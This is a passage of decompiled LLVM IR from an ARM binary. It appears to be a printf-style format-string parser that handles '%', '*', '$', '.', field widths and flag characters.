  br i1 %v2_e034, label %dec_label_pc_e044, label %dec_label_pc_e03c

dec_label_pc_e03c:                                ; preds = %dec_label_pc_e034
  %tmp166 = icmp ult i32 %v1_e02c, 32
  br i1 %tmp166, label %dec_label_pc_e03c.dec_label_pc_e008_crit_edge, label %dec_label_pc_e044

dec_label_pc_e03c.dec_label_pc_e008_crit_edge:    ; preds = %dec_label_pc_e03c
  %v0_e008.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_e008

dec_label_pc_e044:                                ; preds = %dec_label_pc_e03c, %dec_label_pc_e034
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_e04c = ptrtoint i32* %stack_var_-87 to i32
  br label %dec_label_pc_e050

dec_label_pc_e050:                                ; preds = %bb, %dec_label_pc_e044
  %storemerge102 = phi i32 [ %v2_e04c, %dec_label_pc_e044 ], [ %v3_dfe8, %bb ]
  store i32 %storemerge102, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  br label %dec_label_pc_e060

dec_label_pc_e05c:                                ; preds = %.thread22, %dec_label_pc_e16c
  %v0_e05c = phi i32 [ %v2_e1e4, %.thread22 ], [ %storemerge105, %dec_label_pc_e16c ]
  %stack_var_-48.0 = phi i32 [ %stack_var_-48.3, %.thread22 ], [ %stack_var_-48.2, %dec_label_pc_e16c ]
  store i32 %v0_e05c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_e060

dec_label_pc_e060:                                ; preds = %dec_label_pc_e050, %dec_label_pc_e05c
  %v1_e07c = phi i32 [ %storemerge102, %dec_label_pc_e050 ], [ %v0_e05c, %dec_label_pc_e05c ]
  %stack_var_-48.1 = phi i32 [ %tmp106, %dec_label_pc_e050 ], [ %stack_var_-48.0, %dec_label_pc_e05c ]
  %v1_e060 = inttoptr i32 %v1_e07c to i8*
  %v2_e060 = load i8, i8* %v1_e060, align 1
  %v3_e060 = zext i8 %v2_e060 to i32
  store i32 %v3_e060, i32* %r3.global-to-local, align 4
  %v7_e064 = icmp eq i8 %v2_e060, 42
  br i1 %v7_e064, label %bb124, label %.thread9.thread

.thread9.thread:                                  ; preds = %dec_label_pc_e060
  store i32 %v1_e07c, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.preheader

bb124:                                            ; preds = %dec_label_pc_e060
  %v1_e070 = load i32, i32* @lr, align 4
  %v4_e070 = mul i32 %v1_e070, -4
  %v5_e070 = add i32 %v4_e070, %v25_dfb8
  store i32 %v5_e070, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_e07c = add i32 %v1_e07c, 1
  store i32 %v2_e07c, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_e084 = add i32 %v5_e070, -12
  %v4_e084 = inttoptr i32 %v3_e084 to i32*
  store i32 0, i32* %v4_e084, align 4
  %v0_e0a8.pre.pre = load i32, i32* %r6.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %bb124, %.thread9.thread
  %v0_e0a8.pre = phi i32 [ %v0_e0a8.pre.pre, %bb124 ], [ %v1_e07c, %.thread9.thread ]
  %v2_e0ac.pre = load i32, i32* @global_var_18428, align 4
  br label %.backedge

dec_label_pc_e08c:                                ; preds = %.backedge
  store i32 4094, i32* %r3.global-to-local, align 4
  %v0_e090 = load i32, i32* %r0.global-to-local, align 4
  %v7_e094 = icmp sgt i32 %v0_e090, 4094
  br i1 %v7_e094, label %.thread12, label %bb126

.thread12:                                        ; preds = %dec_label_pc_e08c
  %v1_e09c14 = add i32 %v0_e120, 1
  store i32 %v1_e09c14, i32* %r6.global-to-local, align 4
  br label %.backedge

bb126:                                            ; preds = %dec_label_pc_e08c
  %v11_e098 = mul i32 %v0_e090, 10
  %v12_e098 = add i32 %v11_e098, %v3_e0a8
  store i32 %v12_e098, i32* %r3.global-to-local, align 4
  %v1_e09c = add i32 %v0_e120, 1
  store i32 %v1_e09c, i32* %r6.global-to-local, align 4
  %v9_e0a0 = add i32 %v12_e098, -48
  store i32 %v9_e0a0, i32* %r0.global-to-local, align 4
  br label %.backedge

.backedge:                                        ; preds = %.thread12, %bb126, %.preheader
  %v0_e120 = phi i32 [ %v0_e0a8.pre, %.preheader ], [ %v1_e09c, %bb126 ], [ %v1_e09c14, %.thread12 ]
  store i32 99368, i32* %r3.global-to-local, align 4
  %v1_e0a8 = inttoptr i32 %v0_e120 to i8*
  %v2_e0a8 = load i8, i8* %v1_e0a8, align 1
  %v3_e0a8 = zext i8 %v2_e0a8 to i32
  store i32 %v3_e0a8, i32* %r2.global-to-local, align 4
  store i32 %v2_e0ac.pre, i32* %r3.global-to-local, align 4
  %v3_e0b0 = mul nuw nsw i32 %v3_e0a8, 2
  %v4_e0b0 = add i32 %v3_e0b0, %v2_e0ac.pre
  %v5_e0b0 = inttoptr i32 %v4_e0b0 to i8*
  %v6_e0b0 = load i8, i8* %v5_e0b0, align 1
  %v8_e0b0 = zext i8 %v6_e0b0 to i32
  store i32 %v8_e0b0, i32* %r3.global-to-local, align 4
  %v1_e0b4 = and i32 %v8_e0b0, 8
  %v2_e0b4 = icmp eq i32 %v1_e0b4, 0
  br i1 %v2_e0b4, label %dec_label_pc_e0bc, label %dec_label_pc_e08c

dec_label_pc_e0bc:                                ; preds = %.backedge
  %v0_e0bc = load i32, i32* %r1.global-to-local, align 4
  %v1_e0bc = add i32 %v0_e0bc, -1
  %v2_e0bc = inttoptr i32 %v1_e0bc to i8*
  %v3_e0bc = load i8, i8* %v2_e0bc, align 1
  %v4_e0bc = zext i8 %v3_e0bc to i32
  store i32 %v4_e0bc, i32* %r3.global-to-local, align 4
  %v7_e0c0 = icmp eq i8 %v3_e0bc, 37
  br i1 %v7_e0c0, label %dec_label_pc_e0c8, label %dec_label_pc_e184

dec_label_pc_e0c8:                                ; preds = %dec_label_pc_e0bc
  %v7_e0c8 = icmp eq i8 %v2_e0a8, 36
  %. = zext i1 %v7_e0c8 to i32
  store i32 %., i32* @ip, align 4
  %v0_e0d4 = load i32, i32* %r0.global-to-local, align 4
  %tmp129 = icmp slt i32 %v0_e0d4, 1
  br i1 %tmp129, label %bb130, label %thread-pre-split

bb130:                                            ; preds = %dec_label_pc_e0c8
  store i32 0, i32* @ip, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_e0c8, %bb130
  %v1_e130 = phi i32 [ 0, %bb130 ], [ %., %dec_label_pc_e0c8 ]
  %v2_e0dc = icmp eq i32 %v1_e130, 0
  %v0_e10c = load i32, i32* %sb.global-to-local, align 4
  br i1 %v2_e0dc, label %dec_label_pc_e10c, label %dec_label_pc_e0e4

dec_label_pc_e0e4:                                ; preds = %thread-pre-split
  %v2_e10c = icmp eq i32 %v0_e10c, 0
  %v1_e0e8 = add i32 %v0_e120, 1
  store i32 %v1_e0e8, i32* %r1.global-to-local, align 4
  br i1 %v2_e10c, label %dec_label_pc_e44c, label %dec_label_pc_e0f0

dec_label_pc_e0f0:                                ; preds = %dec_label_pc_e0e4
  %v2_e0f0 = sub i32 %v0_e0d4, %v0_e10c
  %v4_e0f0 = xor i32 %v0_e10c, %v0_e0d4
  %v5_e0f0 = xor i32 %v2_e0f0, %v0_e0d4
  %v6_e0f0 = and i32 %v5_e0f0, %v4_e0f0
  %v7_e0f0 = icmp slt i32 %v6_e0f0, 0
  %v8_e0f0 = icmp slt i32 %v2_e0f0, 0
  %v9_e0f0 = icmp eq i32 %v0_e0d4, %v0_e10c
  %v3_e0f4 = xor i1 %v8_e0f0, %v7_e0f0
  %v4_e0f4 = or i1 %v9_e0f0, %v3_e0f4
  br i1 %v4_e0f4, label %dec_label_pc_e104, label %bb131

bb131:                                            ; preds = %dec_label_pc_e0f0
  store i32 %v0_e0d4, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_e104

dec_label_pc_e100:                                ; preds = %dec_label_pc_e120, %dec_label_pc_e128
  store i32 0, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_e104

dec_label_pc_e104:                                ; preds = %bb131, %dec_label_pc_e0f0, %dec_label_pc_e100
  %v0_e104 = phi i32 [ %v0_e0bc, %dec_label_pc_e100 ], [ %v1_e0e8, %dec_label_pc_e0f0 ], [ %v1_e0e8, %bb131 ]
  %stack_var_-48.2 = phi i32 [ %stack_var_-48.1, %dec_label_pc_e100 ], [ %v0_e0d4, %dec_label_pc_e0f0 ], [ %v0_e0d4, %bb131 ]
  br label %dec_label_pc_e13c

dec_label_pc_e10c:                                ; preds = %thread-pre-split
  %tmp132 = icmp slt i32 %v0_e10c, 1
  br i1 %tmp132, label %dec_label_pc_e120, label %dec_label_pc_e114

dec_label_pc_e114:                                ; preds = %dec_label_pc_e10c
  %v7_e114 = icmp eq i8 %v2_e0a8, 109
  br i1 %v7_e114, label %dec_label_pc_e184, label %dec_label_pc_e44c

dec_label_pc_e120:                                ; preds = %dec_label_pc_e10c
  %tmp167 = icmp ugt i32 %v0_e120, %v0_e0bc
  br i1 %tmp167, label %dec_label_pc_e128, label %dec_label_pc_e100

dec_label_pc_e128:                                ; preds = %dec_label_pc_e120
  %v1_e128 = inttoptr i32 %v0_e0bc to i8*
  %v2_e128 = load i8, i8* %v1_e128, align 1
  %v3_e128 = zext i8 %v2_e128 to i32
  store i32 %v3_e128, i32* %r3.global-to-local, align 4
  %v7_e12c = icmp eq i8 %v2_e128, 48
  br i1 %v7_e12c, label %dec_label_pc_e100, label %bb133

bb133:                                            ; preds = %dec_label_pc_e128
  store i32 0, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_e184

dec_label_pc_e13c.loopexit:                       ; preds = %dec_label_pc_e144
  %v1_e150 = load i32, i32* @r4, align 4
  %v3_e150 = or i32 %v1_e150, %v0_e164
  store i32 %v3_e150, i32* @r4, align 4
  %v2_e154 = add i32 %storemerge105, 1
  br label %dec_label_pc_e13c

dec_label_pc_e13c:                                ; preds = %dec_label_pc_e13c.loopexit, %dec_label_pc_e104
  %storemerge105 = phi i32 [ %v0_e104, %dec_label_pc_e104 ], [ %v2_e154, %dec_label_pc_e13c.loopexit ]
  store i32 %storemerge105, i32* %r6.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_169e8.350 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_e148 = inttoptr i32 %storemerge105 to i8*
  br label %dec_label_pc_e144

dec_label_pc_e144:                                ; preds = %dec_label_pc_e15c, %dec_label_pc_e13c
  %v0_e164 = phi i32 [ %v2_e164, %dec_label_pc_e15c ], [ 1, %dec_label_pc_e13c ]
  %v0_e144 = phi i32 [ %v5_e144, %dec_label_pc_e15c ], [ ptrtoint ([8 x i8]* @global_var_169e8.350 to i32), %dec_label_pc_e13c ]
  %v1_e144 = inttoptr i32 %v0_e144 to i8*
  %v2_e144 = load i8, i8* %v1_e144, align 1
  %v3_e144 = zext i8 %v2_e144 to i32
  store i32 %v3_e144, i32* %r2.global-to-local, align 4
  %v5_e144 = add i32 %v0_e144, 1
  store i32 %v5_e144, i32* %r1.global-to-local, align 4
  %v2_e148 = load i8, i8* %v1_e148, align 1
  %v3_e148 = zext i8 %v2_e148 to i32
  store i32 %v3_e148, i32* %r3.global-to-local, align 4
  %v9_e14c = icmp eq i8 %v2_e148, %v2_e144
  br i1 %v9_e14c, label %dec_label_pc_e13c.loopexit, label %dec_label_pc_e15c

dec_label_pc_e15c:                                ; preds = %dec_label_pc_e144
  %v1_e15c = inttoptr i32 %v5_e144 to i8*
  %v2_e15c = load i8, i8* %v1_e15c, align 1
  %v3_e15c = zext i8 %v2_e15c to i32
  store i32 %v3_e15c, i32* %r3.global-to-local, align 4
  %v2_e160 = icmp eq i8 %v2_e15c, 0
  %v2_e164 = mul i32 %v0_e164, 2
  store i32 %v2_e164, i32* %r0.global-to-local, align 4
  br i1 %v2_e160, label %dec_label_pc_e16c, label %dec_label_pc_e144

dec_label_pc_e16c:                                ; preds = %dec_label_pc_e15c
  %v1_e16c = add i32 %storemerge105, -1
  %v2_e16c = inttoptr i32 %v1_e16c to i8*
  %v3_e16c = load i8, i8* %v2_e16c, align 1
  %v7_e170 = icmp eq i8 %v3_e16c, 37
  %v0_e174 = load i32, i32* @r4, align 4
  %v1_e174 = and i32 %v0_e174, 10
  store i32 %v1_e174, i32* %r3.global-to-local, align 4
  %v4_e178 = udiv i32 %v1_e174, 2
  %v5_e178 = sub nuw nsw i32 -1, %v4_e178
  %v6_e178 = and i32 %v0_e174, %v5_e178
  store i32 %v6_e178, i32* @r4, align 4
  br i1 %v7_e170, label %dec_label_pc_e180, label %dec_label_pc_e05c

dec_label_pc_e180:                                ; preds = %dec_label_pc_e16c
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e184

dec_label_pc_e184:                                ; preds = %bb133, %dec_label_pc_e0bc, %dec_label_pc_e114, %dec_label_pc_e180
  %v1_e1c8 = phi i32 [ %storemerge105, %dec_label_pc_e180 ], [ %v0_e120, %bb133 ], [ %v0_e120, %dec_label_pc_e114 ], [ %v0_e120, %dec_label_pc_e0bc ]
  %v0_e1c4 = phi i32 [ %v5_e144, %dec_label_pc_e180 ], [ %v0_e0bc, %bb133 ], [ %v0_e0bc, %dec_label_pc_e114 ], [ %v0_e0bc, %dec_label_pc_e0bc ]
  %stack_var_-48.3 = phi i32 [ %stack_var_-48.2, %dec_label_pc_e180 ], [ %stack_var_-48.1, %bb133 ], [ %stack_var_-48.1, %dec_label_pc_e114 ], [ %stack_var_-48.1, %dec_label_pc_e0bc ]
  %v1_e184 = inttoptr i32 %v0_e1c4 to i8*
  %v2_e184 = load i8, i8* %v1_e184, align 1
  %v3_e184 = zext i8 %v2_e184 to i32
  store i32 %v3_e184, i32* %r3.global-to-local, align 4
  %v7_e188 = icmp eq i8 %v2_e184, 42
  br i1 %v7_e188, label %dec_label_pc_e190, label %dec_label_pc_e1d4

dec_label_pc_e190:                                ; preds = %dec_label_pc_e184
  %v0_e190 = load i32, i32* %sb.global-to-local, align 4
  %v2_e190 = icmp eq i32 %v0_e190, 0
  br i1 %v2_e190, label %dec_label_pc_e1c4, label %dec_label_pc_e198

dec_label_pc_e198:                                ; preds = %dec_label_pc_e190
  %v1_e198 = inttoptr i32 %v1_e1c8 to i8*
  %v2_e198 = load i8, i8* %v1_e198, align 1
  %v3_e198 = zext i8 %v2_e198 to i32
  store i32 %v3_e198, i32* %r3.global-to-local, align 4
  %v7_e19c = icmp eq i8 %v2_e198, 36
  br i1 %v7_e19c, label %dec_label_pc_e1a4, label %dec_label_pc_e44c

dec_label_pc_e1a4:                                ; preds = %dec_label_pc_e198
  %v0_e1a4 = load i32, i32* %r0.global-to-local, align 4
  %tmp134 = icmp slt i32 %v0_e1a4, 1
  br i1 %tmp134, label %dec_label_pc_e44c, label %dec_label_pc_e1ac

dec_label_pc_e1ac:                                ; preds = %dec_label_pc_e1a4
  store i32 %v25_dfb8, i32* %r1.global-to-local, align 4
  %v0_e1b4 = load i32, i32* @lr, align 4
  %v3_e1b4 = mul i32 %v0_e1b4, -4
  %v4_e1b4 = add i32 %v3_e1b4, %v25_dfb8
  store i32 %v4_e1b4, i32* %r3.global-to-local, align 4
  %v1_e1b8 = add i32 %v1_e1c8, 1
  store i32 %v1_e1b8, i32* %r6.global-to-local, align 4
  %v2_e1bc = add i32 %v4_e1b4, -24
  %v3_e1bc = inttoptr i32 %v2_e1bc to i32*
  store i32 %v0_e1a4, i32* %v3_e1bc, align 4
  br label %dec_label_pc_e1d0

dec_label_pc_e1c4:                                ; preds = %dec_label_pc_e190
  %v1_e1c4 = add i32 %v0_e1c4, 1
  store i32 %v1_e1c4, i32* %r3.global-to-local, align 4
  %v9_e1c8 = icmp eq i32 %v1_e1c4, %v1_e1c8
  br i1 %v9_e1c8, label %dec_label_pc_e1d0, label %dec_label_pc_e44c

dec_label_pc_e1d0:                                ; preds = %dec_label_pc_e1c4, %dec_label_pc_e1ac
  store i32 -2147483648, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e1d4

dec_label_pc_e1d4:                                ; preds = %dec_label_pc_e184, %dec_label_pc_e1d0
  %v0_e1d4 = load i32, i32* @lr, align 4
  %v2_e1d4 = icmp eq i32 %v0_e1d4, 0
  br i1 %v2_e1d4, label %dec_label_pc_e1dc, label %dec_label_pc_dff4

dec_label_pc_e1dc:                                ; preds = %dec_label_pc_e1d4
  %v0_e1dc = load i32, i32* %r6.global-to-local, align 4
  %v1_e1dc = inttoptr i32 %v0_e1dc to i8*
  %v2_e1dc = load i8, i8* %v1_e1dc, align 1
  %v3_e1dc = zext i8 %v2_e1dc to i32
  store i32 %v3_e1dc, i32* %r3.global-to-local, align 4
  %v7_e1e0 = icmp eq i8 %v2_e1dc, 46
  br i1 %v7_e1e0, label %.thread22, label %dec_label_pc_e1f4

.thread22:                                        ; preds = %dec_label_pc_e1dc
  %v2_e1e4 = add i32 %v0_e1dc, 1
  store i32 %v2_e1e4, i32* %r6.global-to-local, align 4
  %v1_e1e8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v1_e1e8, i32* %r8.global-to-local, align 4
  store i32 -1, i32* @lr, align 4
  br label %dec_label_pc_e05c

dec_label_pc_e1f4:                                ; preds = %dec_label_pc_e1dc
  %v0_e1f4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_e1f4, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_e1fc

dec_label_pc_e1fc:                                ; preds = %dec_label_pc_dff4, %dec_label_pc_e1f4
  %v0_e204.pre = phi i32 [ %v0_e1dc, %dec_label_pc_e1f4 ], [ %v0_e204.pre.pre, %dec_label_pc_dff4 ]
  %storemerge = phi i32 [ -1, %dec_label_pc_e1f4 ], [ %v0_dff4, %dec_label_pc_dff4 ]
  store i32 %storemerge, i32* @r5, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_16990.352 to i32), i32* %r1.global-to-local, align 4
  %v1_e204 = inttoptr i32 %v0_e204.pre to i8*
  br label %dec_label_pc_e200

dec_label_pc_e200:                                ; preds = %dec_label_pc_e210, %dec_label_pc_e1fc
  %v0_e210 = phi i32 [ %v1_e210, %dec_label_pc_e210 ], [ ptrtoint ([9 x i8]* @global_var_16990.352 to i32), %dec_label_pc_e1fc ]
  %v1_e200 = inttoptr i32 %v0_e210 to i8*
  %v2_e200 = load i8, i8* %v1_e200, align 1
  %v3_e200 = zext i8 %v2_e200 to i32
  store i32 %v3_e200, i32* %r2.global-to-local, align 4
  %v2_e204 = load i8, i8* %v1_e204, align 1
  %v3_e204 = zext i8 %v2_e204 to i32
  store i32 %v3_e204, i32* %r3.global-to-local, align 4
  %v9_e208 = icmp eq i8 %v2_e204, %v2_e200
  br i1 %v9_e208, label %dec_label_pc_dffc, label %dec_label_pc_e210

dec_label_pc_e210:                                ; preds = %dec_label_pc_e200
  %v1_e210 = add i32 %v0_e210, 1
  %v2_e210 = inttoptr i32 %v1_e210 to i8*
  %v3_e210 = load i8, i8* %v2_e210, align 1
  %v4_e210 = zext i8 %v3_e210 to i32
  store i32 %v4_e210, i32* %r3.global-to-local, align 4
  store i32 %v1_e210, i32* %r1.global-to-local, align 4
  %v2_e214 = icmp eq i8 %v3_e210, 0
  br i1 %v2_e214, label %dec_label_pc_e21c, label %dec_label_pc_e200

dec_label_pc_e21c:                                ; preds = %dec_label_pc_e210, %dec_label_pc_dffc
  %v1_e23c = phi i32 [ %v1_dffc, %dec_label_pc_dffc ], [ %v0_e204.pre, %dec_label_pc_e210 ]
  %v1_e238 = phi i32 [ %v0_e210, %dec_label_pc_dffc ], [ %v1_e210, %dec_label_pc_e210 ]
  %v2_e220 = sub i32 %v1_e238, ptrtoint ([9 x i8]* @global_var_16990.352 to i32)
  store i32 %v2_e220, i32* %r3.global-to-local, align 4
  %v8_e228 = icmp sgt i32 %v2_e220, 1
  br i1 %v8_e228, label %.thread25, label %dec_label_pc_e22c

dec_label_pc_e22c:                                ; preds = %dec_label_pc_e21c
  %v1_e22c = inttoptr i32 %v1_e23c to i8*
  %v2_e22c = load i8, i8* %v1_e22c, align 1
  %v3_e22c = zext i8 %v2_e22c to i32
  store i32 %v3_e22c, i32* %r2.global-to-local, align 4
  %v1_e230 = inttoptr i32 %v1_e238 to i8*
  %v2_e230 = load i8, i8* %v1_e230, align 1
  %v3_e230 = zext i8 %v2_e230 to i32
  store i32 %v3_e230, i32* %r3.global-to-local, align 4
  %v9_e234 = icmp eq i8 %v2_e22c, %v2_e230
  br i1 %v9_e234, label %bb135, label %.thread25

bb135:                                            ; preds = %dec_label_pc_e22c
  %v2_e238 = add i32 %v1_e238, 9
  store i32 %v2_e238, i32* %r1.global-to-local, align 4
  %v2_e23c = add i32 %v1_e23c, 1
  store i32 %v2_e23c, i32* %r6.global-to-local, align 4
  br label %.thread25

.thread25:                                        ; preds = %dec_label_pc_e22c, %dec_label_pc_e21c, %bb135
  %v0_e244 = phi i32 [ %v1_e238, %dec_label_pc_e22c ], [ %v1_e238, %dec_label_pc_e21c ], [ %v2_e238, %bb135 ]
  %v0_e240 = phi i32 [ %v1_e23c, %dec_label_pc_e22c ], [ %v1_e23c, %dec_label_pc_e21c ], [ %v2_e23c, %bb135 ]
  %v1_e240 = inttoptr i32 %v0_e240 to i8*
  %v2_e240 = load i8, i8* %v1_e240, align 1
  %v3_e240 = zext i8 %v2_e240 to i32
  store i32 %v3_e240, i32* %r2.global-to-local, align 4
  %v1_e244 = add i32 %v0_e244, 9
  %v2_e244 = inttoptr i32 %v1_e244 to i8*
  %v3_e244 = load i8, i8* %v2_e244, align 1
  %v4_e244 = zext i8 %v3_e244 to i32
  store i32 %v4_e244, i32* %r3.global-to-local, align 4
  %v2_e248 = icmp eq i8 %v2_e240, 0
  %v3_e24c = mul nuw nsw i32 %v4_e244, 256
  store i32 %v3_e24c, i32* @lr, align 4
  br i1 %v2_e248, label %dec_label_pc_e44c, label %dec_label_pc_e254

dec_label_pc_e254:                                ; preds = %.thread25
  %v3_e258 = load i32, i32* %stack_var_-36, align 4
  store i32 %v3_e258, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e25c

dec_label_pc_e25c:                                ; preds = %dec_label_pc_e2e0, %dec_label_pc_e254
  %v1_e26c = phi i32 [ %v1_e2e0, %dec_label_pc_e2e0 ], [ ptrtoint ([21 x i8]* @global_var_169d0.354 to i32), %dec_label_pc_e254 ]
  %v1_e25c = inttoptr i32 %v1_e26c to i8*
  %v2_e25c = load i8, i8* %v1_e25c, align 1
  %v3_e25c = zext i8 %v2_e25c to i32
  store i32 %v3_e25c, i32* %r3.global-to-local, align 4
  %v9_e260 = icmp eq i8 %v2_e25c, %v2_e240
  br i1 %v9_e260, label %dec_label_pc_e268, label %dec_label_pc_e2e0

dec_label_pc_e268:                                ; preds = %dec_label_pc_e25c
  store i32 ptrtoint ([21 x i8]* @global_var_169d0.354 to i32), i32* %r3.global-to-local, align 4
  %v2_e26c = sub i32 %v1_e26c, ptrtoint ([21 x i8]* @global_var_169d0.354 to i32)
  store i32 %v2_e26c, i32* %r2.global-to-local, align 4
  %v7_e274 = icmp slt i32 %v2_e26c, 18
  br i1 %v7_e274, label %bb137, label %dec_label_pc_e278

dec_label_pc_e278:                                ; preds = %dec_label_pc_e268
  %v1_e278 = and i32 %v3_e24c, 1024
  %v2_e278 = icmp eq i32 %v1_e278, 0
  br i1 %v2_e278, label %bb137, label %bb136

bb136:                                            ; preds = %dec_label_pc_e278
  %v2_e27c = add i32 %v2_e26c, -2
  store i32 %v2_e27c, i32* %r2.global-to-local, align 4
  br label %bb137

bb137:                                            ; preds = %dec_label_pc_e268, %dec_label_pc_e278, %bb136
  %v0_e280 = phi i32 [ %v2_e26c, %dec_label_pc_e268 ], [ %v2_e26c, %dec_label_pc_e278 ], [ %v2_e27c, %bb136 ]
  %v1_e280 = load i32, i32* %r7.global-to-local, align 4
  %v2_e280 = add i32 %v1_e280, 32
  %v3_e280 = inttoptr i32 %v2_e280 to i32*
  store i32 %v0_e280, i32* %v3_e280, align 4
  store i32 ptrtoint (i32* @global_var_169c3.356 to i32), i32* %r1.global-to-local, align 4
  %v0_e28c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_e288

dec_label_pc_e288:                                ; preds = %dec_label_pc_e288, %bb137
  %v0_e288 = phi i32 [ %v1_e288, %dec_label_pc_e288 ], [ ptrtoint (i32* @global_var_169c3.356 to i32), %bb137 ]
  %v1_e288 = add i32 %v0_e288, 1
  %v2_e288 = inttoptr i32 %v1_e288 to i8*
  %v3_e288 = load i8, i8* %v2_e288, align 1
  %v4_e288 = zext i8 %v3_e288 to i32
  store i32 %v4_e288, i32* %r3.global-to-local, align 4
  store i32 %v1_e288, i32* %r1.global-to-local, align 4
  %v8_e290 = icmp sgt i32 %v0_e28c.pre, %v4_e288
  br i1 %v8_e290, label %dec_label_pc_e288, label %dec_label_pc_e294

dec_label_pc_e294:                                ; preds = %dec_label_pc_e288
  store i32 ptrtoint (i32* @global_var_169b4.360 to i32), i32* %r0.global-to-local, align 4
  %v2_e29c = sub i32 %v1_e288, ptrtoint (i32* @global_var_169c4.358 to i32)
  %v2_e2a0 = mul i32 %v2_e29c, 2
  store i32 %v2_e2a0, i32* %r3.global-to-local, align 4
  %v2_e2a8 = add i32 %v2_e2a0, ptrtoint (i32* @global_var_169b4.360 to i32)
  store i32 %v2_e2a8, i32* %r2.global-to-local, align 4
  %v1_e2ac = add i32 %v2_e2a0, add (i32 ptrtoint (i32* @global_var_169b4.360 to i32), i32 1)
  %v2_e2ac = inttoptr i32 %v1_e2ac to i8*
  %v3_e2ac = load i8, i8* %v2_e2ac, align 1
  %v4_e2ac = zext i8 %v3_e2ac to i32
  store i32 %v4_e2ac, i32* %r1.global-to-local, align 4
  %v2_e2b0 = add i32 %v2_e2a0, ptrtoint (i32* @global_var_169a4.362 to i32)
  store i32 %v2_e2b0, i32* %r2.global-to-local, align 4
  %v3_e2b4 = inttoptr i32 %v2_e2a8 to i8*
  %v4_e2b4 = load i8, i8* %v3_e2b4, align 2
  %v6_e2b4 = zext i8 %v4_e2b4 to i32
  store i32 %v6_e2b4, i32* %r0.global-to-local, align 4
  %v1_e2b8 = add i32 %v2_e2a0, add (i32 ptrtoint (i32* @global_var_169a4.362 to i32), i32 1)
  %v2_e2b8 = inttoptr i32 %v1_e2b8 to i8*
  %v3_e2b8 = load i8, i8* %v2_e2b8, align 1
  %v4_e2b8 = zext i8 %v3_e2b8 to i32
  store i32 %v4_e2b8, i32* %r2.global-to-local, align 4
  %v3_e2bc = inttoptr i32 %v2_e2b0 to i8*
  %v4_e2bc = load i8, i8* %v3_e2bc, align 2
  %v6_e2bc = zext i8 %v4_e2bc to i32
  %v3_e2c0 = mul nuw i32 %v4_e2ac, 16777216
  store i32 %v3_e2c0, i32* %r1.global-to-local, align 4
  %v4_e2c4 = sdiv i32 %v3_e2c0, 65536
  %v5_e2c4 = or i32 %v6_e2b4, %v4_e2c4
  %v3_e2c8 = mul nuw i32 %v4_e2b8, 16777216
  store i32 %v3_e2c8, i32* %r2.global-to-local, align 4
  %v4_e2cc = sdiv i32 %v3_e2c8, 65536
  %v5_e2cc = or i32 %v6_e2bc, %v4_e2cc
  store i32 %v5_e2cc, i32* %r3.global-to-local, align 4
  %v0_e2d0 = load i32, i32* @lr, align 4
  %v2_e2d0 = or i32 %v5_e2c4, %v0_e2d0
  store i32 ptrtoint ([21 x i8]* @global_var_169d0.354 to i32), i32* @ip, align 4
  %v2_e2d8 = and i32 %v2_e2d0, %v5_e2cc
  store i32 %v2_e2d8, i32* %r0.global-to-local, align 4
  %v0_e2f4.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_e2ec

dec_label_pc_e2e0:                                ; preds = %dec_label_pc_e25c
  %v1_e2e0 = add i32 %v1_e26c, 1
  %v2_e2e0 = inttoptr i32 %v1_e2e0 to i8*
  %v3_e2e0 = load i8, i8* %v2_e2e0, align 1
  %v4_e2e0 = zext i8 %v3_e2e0 to i32
  store i32 %v4_e2e0, i32* %r3.global-to-local, align 4
  store i32 %v1_e2e0, i32* @ip, align 4
  %v2_e2e4 = icmp eq i8 %v3_e2e0, 0
  br i1 %v2_e2e4, label %dec_label_pc_e2ec, label %dec_label_pc_e25c

dec_label_pc_e2ec:                                ; preds = %dec_label_pc_e2e0, %dec_label_pc_e294
  %v0_e2f8 = phi i32 [ %v0_e2d0, %dec_label_pc_e294 ], [ %v3_e24c, %dec_label_pc_e2e0 ]
  %v0_e2f4 = phi i32 [ %v0_e2f4.pre, %dec_label_pc_e294 ], [ %v0_e240, %dec_label_pc_e2e0 ]
  %v0_e2ec = phi i32 [ %v2_e2d8, %dec_label_pc_e294 ], [ %v3_e258, %dec_label_pc_e2e0 ]
  store i32 %v0_e2ec, i32* %stack_var_-36, align 4
  %v0_e2f0 = load i32, i32* @r4, align 4
  %v1_e2f0 = and i32 %v0_e2f0, 4
  %v1_e2f4 = inttoptr i32 %v0_e2f4 to i8*
  %v2_e2f4 = load i8, i8* %v1_e2f4, align 1
  %v3_e2f4 = zext i8 %v2_e2f4 to i32
  store i32 %v3_e2f4, i32* %r1.global-to-local, align 4
  %v1_e2f8 = and i32 %v0_e2f8, 3840
  %v1_e2fc = and i32 %v0_e2f0, -5
  %v2_e300 = or i32 %v1_e2fc, %v1_e2f8
  store i32 %v2_e300, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %tmp164 = mul nuw nsw i32 %v1_e2f0, 4
  %tmp165 = or i32 %tmp164, 32
  store i32 %tmp165, i32* %r3.global-to-local, align 4
  %v1_e310 = load i32, i32* %r7.global-to-local, align 4
